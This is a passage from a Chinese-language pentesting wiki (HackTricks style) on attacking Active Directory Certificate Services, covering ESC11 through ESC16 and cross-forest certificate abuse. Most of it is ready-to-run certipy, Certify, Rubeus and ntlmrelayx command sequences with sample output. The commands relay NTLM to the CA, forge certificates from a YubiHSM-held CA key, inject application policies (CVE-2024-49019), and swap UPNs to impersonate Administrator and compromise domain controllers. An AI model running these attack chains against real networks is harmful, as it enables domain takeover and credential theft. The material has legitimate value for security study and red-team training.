以默认 `User` 模板，以 `Jane` 身份请求用于客户端认证的证书。
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`的`userPrincipalName`在此过程之后会恢复为原始值。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
要通过 Schannel 进行身份验证，使用 Certipy 的 `-ldap-shell` 选项，显示身份验证成功为 `u:CORP\DC$`。
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
通过 LDAP shell，像 `set_rbcd` 这样的命令可以启用 Resource-Based Constrained Delegation (RBCD) 攻击，可能危及域控制器。
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
该漏洞同样影响任何缺少 `userPrincipalName` 的用户帐户，或 `userPrincipalName` 与 `sAMAccountName` 不匹配的帐户。默认的 `Administrator@corp.local` 是主要目标，因为它具有较高的 LDAP 权限并且默认没有 `userPrincipalName`。

## Relaying NTLM to ICPR - ESC11

### 说明

如果 CA Server 未配置 `IF_ENFORCEENCRYPTICERTREQUEST`，则可以通过 RPC 服务进行未签名的 NTLM relay attacks。 [参考](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)。

你可以使用 `certipy` 枚举 `Enforce Encryption for Requests` 是否被禁用，certipy 将显示 `ESC11` 漏洞。
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### 滥用场景

需要设置一个中继服务器：
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
注意：对于域控制器，我们必须在 DomainController 中指定 `-template`。

或者使用 [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) :
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access to ADCS CA with YubiHSM - ESC12

### 说明

管理员可以将证书颁发机构配置为将密钥存储在外部设备上，例如 "Yubico YubiHSM2"。

如果 USB 设备通过 USB 端口连接到 CA 服务器，或者当 CA 服务器是虚拟机时通过 USB 设备服务器连接，Key Storage Provider 需要一个认证密钥（有时称为 “password”）来在 YubiHSM 中生成和使用密钥。

该密钥/密码以明文存储在注册表的 `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` 下。

Reference in [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### 滥用场景

如果 CA 的私钥存储在物理 USB 设备上，而你获得了 shell 访问，则有可能恢复该密钥。

首先，你需要获取 CA 证书（这是公开的），然后：
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
最后，使用 certutil `-sign` 命令利用 CA 证书及其私钥伪造一个新的任意证书。

## OID Group Link Abuse - ESC13

### 解释

`msPKI-Certificate-Policy` 属性允许将颁发策略添加到证书模板。负责颁发策略的 `msPKI-Enterprise-Oid` 对象可以在 PKI OID 容器的 Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) 中发现。策略可以使用该对象的 `msDS-OIDToGroupLink` 属性链接到一个 AD 组，从而使系统在用户出示该证书时，将该用户授权为该组的成员。 [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

换句话说，当用户有权限为证书进行注册（enroll），且证书与一个 OID 组关联时，用户可以继承该组的权限。

使用 [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) 来查找 OIDToGroupLink:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### 滥用场景

找到用户权限，可以使用 `certipy find` 或 `Certify.exe find /showAllPermissions`。

如果 `John` 有权限为模板 `VulnerableTemplate` 登记（enroll），该用户可以继承 `VulnerableGroup` 组的权限。

所需做的只是指定该模板，便会得到一个具有 OIDToGroupLink 权限的证书。
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## 易受攻击的证书更新配置 - ESC14

### 说明

https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping 上的描述非常详尽。下面是原文的引用。

ESC14 处理由“弱显式证书映射”引起的漏洞，主要通过对 Active Directory 用户或计算机帐户上的 `altSecurityIdentities` 属性的误用或不安全配置。该多值属性允许管理员手动将 X.509 证书与 AD 帐户关联以用于身份验证。当填充时，这些显式映射可以覆盖默认的证书映射逻辑（通常依赖于证书 SAN 中的 UPN 或 DNS 名称，或嵌入在 `szOID_NTDS_CA_SECURITY_EXT` 安全扩展中的 SID）。

“弱”映射发生在用于在 `altSecurityIdentities` 属性中标识证书的字符串值过于宽泛、易于猜测、依赖非唯一证书字段或使用易被伪造的证书组件时。如果攻击者能够获得或伪造一个其属性匹配对特权帐户的这种弱定义显式映射的证书，就可以使用该证书进行身份验证并冒充该帐户。

可能弱的 `altSecurityIdentities` 映射字符串示例包括：

- 仅按常见 Subject Common Name (CN) 映射：例如 `X509:<S>CN=SomeUser`。攻击者可能能够从较不安全的来源获取具有该 CN 的证书。
- 使用过于通用的 Issuer Distinguished Names (DNs) 或 Subject DNs 而没有进一步限定（例如特定的序列号或 subject key identifier）：例如 `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`。
- 使用其他可预测的模式或非加密标识符，攻击者可能能够在他们合法获取或伪造的证书中满足这些要求（如果他们已攻破 CA 或发现像 ESC1 中那样的脆弱模板）。

`altSecurityIdentities` 属性支持多种映射格式，例如：

- `X509:<I>IssuerDN<S>SubjectDN`（按完整 Issuer 和 Subject DN 映射）
- `X509:<SKI>SubjectKeyIdentifier`（按证书的 Subject Key Identifier 扩展值映射）
- `X509:<SR>SerialNumberBackedByIssuerDN`（按序列号映射，隐含由 Issuer DN 限定） - 这不是标准格式，通常是 `<I>IssuerDN<SR>SerialNumber`。
- `X509:<RFC822>EmailAddress`（按 SAN 中的 RFC822 名称，通常是电子邮件地址 映射）
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey`（按证书原始公钥的 SHA1 哈希映射 - 通常较强）

这些映射的安全性在很大程度上取决于映射字符串中所选证书标识符的具体性、唯一性和密码强度。即使在域控制器上启用了强证书绑定模式（这主要影响基于 SAN UPN/DNS 和 SID 扩展的隐式映射），配置不当的 `altSecurityIdentities` 条目仍可能在映射逻辑本身存在缺陷或过于宽松时为冒充提供直接路径。

### 滥用场景

ESC14 针对 Active Directory (AD) 中的显式证书映射，特别是 `altSecurityIdentities` 属性。如果设置了此属性（出于设计或错误配置），攻击者可以通过出示与映射匹配的证书来冒充帐户。

#### 场景 A：攻击者可以写入 `altSecurityIdentities`

**前提条件**：攻击者对目标帐户的 `altSecurityIdentities` 属性具有写入权限，或具有以以下某种权限形式授予该写入能力的权限，对目标 AD 对象具有以下之一：
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.

#### 场景 B：目标通过 X509RFC822（Email）存在弱映射

- **前提条件**：目标在 `altSecurityIdentities` 中有一个弱的 X509RFC822 映射。攻击者可以将受害者的 mail 属性设置为与目标的 X509RFC822 名称匹配，代表受害者登记一个证书，并使用该证书作为目标进行身份验证。

#### 场景 C：目标有 X509IssuerSubject 映射

- **前提条件**：目标在 `altSecurityIdentities` 中有一个弱的 X509IssuerSubject 显式映射。攻击者可以将受害主体的 `cn` 或 `dNSHostName` 属性设置为与目标的 X509IssuerSubject 映射中的 subject 匹配。然后，攻击者可以代表受害者登记证书，并使用该证书作为目标进行身份验证。

#### 场景 D：目标有 X509SubjectOnly 映射

- **前提条件**：目标在 `altSecurityIdentities` 中有一个弱的 X509SubjectOnly 显式映射。攻击者可以将受害主体的 `cn` 或 `dNSHostName` 属性设置为与目标的 X509SubjectOnly 映射中的 subject 匹配。然后，攻击者可以代表受害者登记证书，并使用该证书作为目标进行身份验证。

### 具体操作
#### 场景 A

请求证书，使用证书模板 `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
保存并转换证书
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
认证 (使用证书)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
清理（可选）
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
有关不同攻击场景中更具体的攻击方法，请参阅以下内容： [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### 说明

在 https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc 的描述非常详尽。下面引用原文内容。

Using built-in default version 1 certificate templates, an attacker can craft a CSR to include application policies that are preferred over the configured Extended Key Usage attributes specified in the template. The only requirement is enrollment rights, and it can be used to generate client authentication, certificate request agent, and codesigning certificates using the **_WebServer_** template

### 利用

以下参考了 [此链接]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu)，点击查看更详细的使用方法。

Certipy 的 `find` 命令可以帮助识别在 CA 未打补丁时可能易受 ESC15 影响的 V1 模板。
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### 场景 A：通过 Schannel 的直接模拟

**步骤 1：请求证书，注入 "Client Authentication" Application Policy 和目标 UPN。** 攻击者 `attacker@corp.local` 使用 "WebServer" V1 模板（允许申请者提供 subject）针对 `administrator@corp.local`。
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: 易受攻击的 V1 模板，具有 “Enrollee supplies subject”。
- `-application-policies 'Client Authentication'`: 将 OID `1.3.6.1.5.5.7.3.2` 注入到 CSR 的 Application Policies 扩展中。
- `-upn 'administrator@corp.local'`: 在 SAN 中设置 UPN 以进行冒充。

**步骤 2：使用获取的证书通过 Schannel (LDAPS) 进行身份验证。**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### 场景 B：通过 Enrollment Agent 滥用实现 PKINIT/Kerberos 冒充

**步骤 1：从 V1 模板（带有 "Enrollee supplies subject"）请求证书，同时注入 "Certificate Request Agent" Application Policy。** 该证书用于使攻击者（`attacker@corp.local`）成为 Enrollment Agent。这里未为攻击者自身指定 UPN，因为目标是获得 Enrollment Agent 的能力。
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: 注入 OID `1.3.6.1.4.1.311.20.2.1`。

**步骤 2：使用 "agent" 证书代表目标特权用户请求证书。** 这是一个类似 ESC3 的步骤，使用步骤 1 得到的证书作为 agent 证书。
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**第3步：使用 "on-behalf-of" 证书以特权用户的身份进行身份验证。**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## CA 上禁用安全扩展（全局）-ESC16

### 解释

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** 指的是当 AD CS 的配置未强制在所有证书中包含 **szOID_NTDS_CA_SECURITY_EXT** 扩展时，攻击者可以利用这一点：

1. 请求一个 **没有 SID 绑定** 的证书。

2. 使用该证书 **作为任何账户进行身份验证**，例如冒充高权限账户（例如，域管理员 Domain Administrator）。

你也可以参阅这篇文章以了解更详细的原理：https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6

### 滥用

以下参考自 [此链接](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally)，点击以查看更详细的使用方法。

要识别 Active Directory Certificate Services (AD CS) 环境是否易受 **ESC16** 影响
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**步骤 1：读取受害者账户的初始 UPN（可选 - 用于恢复）。**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**步骤 2：将受害者账户的 UPN 更新为目标管理员的 `sAMAccountName`。**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**步骤 3：（如有需要）获取 "受害者" 账户的 credentials（例如，通过 Shadow Credentials）。**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Step 4: 作为 "victim" 用户从 _任何合适的客户端身份验证模板_（例如 "User"）在易受 ESC16 影响的 CA 上请求证书。** 由于该 CA 易受 ESC16 影响，它会自动从签发的证书中省略 SID 安全扩展，无论模板对该扩展的具体设置如何。设置 Kerberos 凭证缓存环境变量（shell 命令）：
```bash
export KRB5CCNAME=victim.ccache
```
然后请求证书：
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**步骤 5：将 "victim" 帐户的 UPN 还原。**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**第6步：以目标管理员身份进行身份验证。**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## 用被动语态解释通过证书攻破域林

### 被妥协的 CA 导致的域林信任破坏

用于跨域林注册（**cross-forest enrollment**）的配置被设定得相对简单。资源域林的 **root CA certificate** 会被管理员发布到各个 account forests，资源域林的 **enterprise CA** 证书会被添加到每个 account forest 的 `NTAuthCertificates` 和 AIA 容器中。为澄清，这种安排会将资源域林中的 **CA 完全控制权** 授予它所管理 PKI 的所有其他域林。如果该 CA 被攻击者**妥协**，资源域林和 account forests 中所有用户的证书都可能被他们**伪造**，从而破坏域林的安全边界。

### 授予外域主体的注册权限

在多域林环境中，应当对那些发布允许 **Authenticated Users 或 foreign principals**（即属于 Enterprise CA 所在域林以外的用户/组）**注册和编辑权限** 的 Enterprise CAs 保持谨慎。\
在跨信任进行身份验证时，AD 会将 **Authenticated Users SID** 添加到用户的令牌中。因此，如果某域拥有一个 Enterprise CA 且其模板**允许 Authenticated Users 注册权限**，则该模板可能会被来自不同域林的用户**注册**。同样，如果模板显式地将注册权限授予某个外域主体，则会由此创建一个**跨域林的访问控制关系**，使得一个域林中的主体可以**注册另一个域林的模板**。

这两种情形都会导致从一个域林到另一个域林的**攻击面增加**。攻击者可能利用证书模板的设置在外域中获取额外的权限。


## References

- [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../../banners/hacktricks-training.md}}
